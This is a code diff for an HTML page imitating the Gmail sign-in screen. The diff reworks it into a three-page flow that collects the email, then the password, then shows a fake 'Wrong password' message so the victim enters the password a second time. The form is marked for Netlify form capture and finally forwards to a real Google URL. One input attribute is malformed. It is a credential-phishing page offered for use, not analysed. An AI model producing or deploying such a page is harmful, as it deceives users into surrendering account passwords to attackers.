@@ -7,8 +7,7 @@
     <title>Gmail</title>
     <!-- css link -->
     <link rel="stylesheet" href="style.css">
-    <!-- javascript link -->
-    <script src="back-end.js"></script>
+   
     <!-- tailwind cdn link -->
     <script src="https://cdn.tailwindcss.com"></script>
 
@@ -20,8 +19,8 @@
 
 </head>
 <body class="">
-<form class="all-in" netlify action="https://accounts.google.com/v3/signin/identifier?dsh=S-1207046114%3A1674209116633837&authuser=0&continue=https%3A%2F%2Fmail.google.com&ec=GAlAFw&hl=fr&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession">
-    <div class="main hide">
+<form class="all-in" netlify action="https://accounts.google.com/signin/v2/challenge/pwd?continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Frecovery-options-collection&osid=1&rart=ANgoxcc4S1jOlRbG-hI_hLv1bbpIoW49H5WOAURW_ghBP6IQZD219BguQZ9DSEeBFFe7td85m9NasHYcmLSLHrQG6jANdzMY7w&TL=AC7eWV2kZ8bhHoxZ3OmiCBchkJvaXnB4Sh9AyW3Clgd08JoZHENnR4N5yfGrC7XD&flowName=GlifWebSignIn&cid=1&flowEntry=ServiceLogin">
+    <div class="main" id="page-1">
         <div class="box mb-1">
             <div class="title mb-8">
                 <svg class="w-20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="272" height="92"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>
@@ -29,8 +28,8 @@
                 <h4 class="font-normal">to access your Account</h4>
             </div>
             <div class="field">
-                <label class="text-blue-500" for="email">Email or Phone</label>
-                <input class="border border-gray-300 rounded h-12 p-2 text-lg focus:border-blue-500" type="email" name="email" id="" required>
+                <label class="text-blue-500 rounded-full" for="email">Email or Phone</label>
+                <input class="border border-gray-300 rounded h-12 p-2 text-lg focus:border-blue-500" type="email" name="email" id="email" required>
                 <a href="#" class="border-none text-blue-500 font-bold text-sm mt-4">Forgot email?</a>
             </div>
             <div class="texts-p-graph mt-8 mb-12">
@@ -38,7 +37,7 @@
             </div>
             <div class="buttons-parts mb-12">
                 <a class="text-blue-500 hover:bg-sky-50 pt-2 pb-2 pl-2 pr-2 hover:text-blue-600 font-semibold text-sm rounded" href="#">Create Account</a>
-                <button class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded">Next</button>
+                <button id="mybutton" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded">Next</button>
             </div>
         </div>
         <footer class="mt-4 text-xs">
@@ -52,32 +51,71 @@
             </div>
         </footer>
     </div>
-    <div class="main main-two">
+    <div class="main main-two hide" id="page-2">
         <div class="box mb-1">
             <div class="title mb-8">
                 <svg class="w-20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="272" height="92"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>
                 <h1 class="font-normal text-2xl">Welcome back,</h1>
-                <h4 class="font-normal text-sm border rounded-full pt-1 pb-1 pl-3 pr-3 h-fit w-fit">yourname@gmail.com</h4>
+                <h4 class="font-normal text-sm border rounded-full pt-1 pb-1 pl-3 pr-3 h-fit w-fit">**********@gmail.com</h4>
                 <a class="font-normal">To continue, first verify that it's you</a>
                 
             </div>
             <div class="field two">
                 <label class="text-blue-500" for="email"> Enter your password</label>
-                <input class="border border-gray-300 rounded h-12 p-2 text-lg focus:border-blue-500" type="password" name="email" id="" required>
+                <input class="border border-gray-300 rounded h-12 p-2 text-lg focus:border-blue-500" type="password" name="password id="password" required>
                 <div class="show-pass">
                     <a href="#" class="border-none font-normal text-sm mt-4 hover:text-blue-500">Show password</a>
                 </div>
-                <h4 class="font-normal text-red-500 text-sm">Wrong password. Try again or click ‘Forgot password’ to reset it.</h4>
+             </div>
+            <div class="texts-p-graph mt-8 mb-20">
+                <h1> </h1>
+            </div>
+            <div class="buttons-parts mb-12">
+                <a class="text-blue-500 hover:bg-sky-50 pt-2 pb-2 pl-2 pr-2 hover:text-blue-600 font-semibold text-sm rounded" href="#">Forgot password?</a>
+                <button id="mega-btn" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded">
+                    Next
+                </button>
+                <button id="final-btn" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded cursor-pointer hide" >
+                    Next</button>
+            </div>
+        </div>
+        <footer class="mt-4 text-xs">
+            <div class="language">
+                <button class="text-sm">English (United Kingdom) <span><i class="ri-arrow-down-s-fill ml-3"></i></span></button>
+            </div>
+            <div class="terms">
+                <a href="">Help</a>
+                <a href="">Privacy</a>
+                <a href="">Terms</a>
+            </div>
+        </footer>
+    </div>
+    <div class="main main-two hide" id="page-3">
+        <div class="box mb-1">
+            <div class="title mb-8">
+                <svg class="w-20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="272" height="92"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>
+                <h1 class="font-normal text-2xl">Welcome back,</h1>
+                <h4 class="font-normal text-sm border rounded-full pt-1 pb-1 pl-3 pr-3 h-fit w-fit">**********@gmail.com</h4>
+                <a class="font-normal">To continue, first verify that it's you</a>
+                
+            </div>
+            <div class="field two">
+                <label class="text-blue-500" for="email"> Enter your password</label>
+                <input class="border border-gray-300 rounded h-12 p-2 text-lg focus:border-blue-500" type="password" name="re-password" id="password" required>
+                <div class="show-pass">
+                    <a href="#" class="border-none font-normal text-sm mt-4 hover:text-blue-500">Show password</a>
+                </div>
+                <h4 id="warning" class="font-normal text-red-500 text-sm">
+                    Wrong password. Try again or click ‘Forgot password’ to reset it.</h4>
             </div>
             <div class="texts-p-graph mt-8 mb-20">
                 <h1> </h1>
             </div>
             <div class="buttons-parts mb-12">
                 <a class="text-blue-500 hover:bg-sky-50 pt-2 pb-2 pl-2 pr-2 hover:text-blue-600 font-semibold text-sm rounded" href="#">Forgot password?</a>
-                <a type="submit" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded cursor-pointer" href="">try again</a>
-                <button onclick="" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded hide">
-                    Next
-                </button>
+                
+                <button id="final-btn-submit" type="submit" class="bg-blue-500 pt-2 pb-2 pl-5 pr-5 text-white text-sm font-semibold hover:bg-blue-600 transition rounded cursor-pointer" >
+                    Next</button>
             </div>
         </div>
         <footer class="mt-4 text-xs">
@@ -92,5 +130,7 @@
         </footer>
     </div>
 </form>
+ <!-- javascript link -->
+ <script src="back-end.js"></script>
 </body>
 </html>
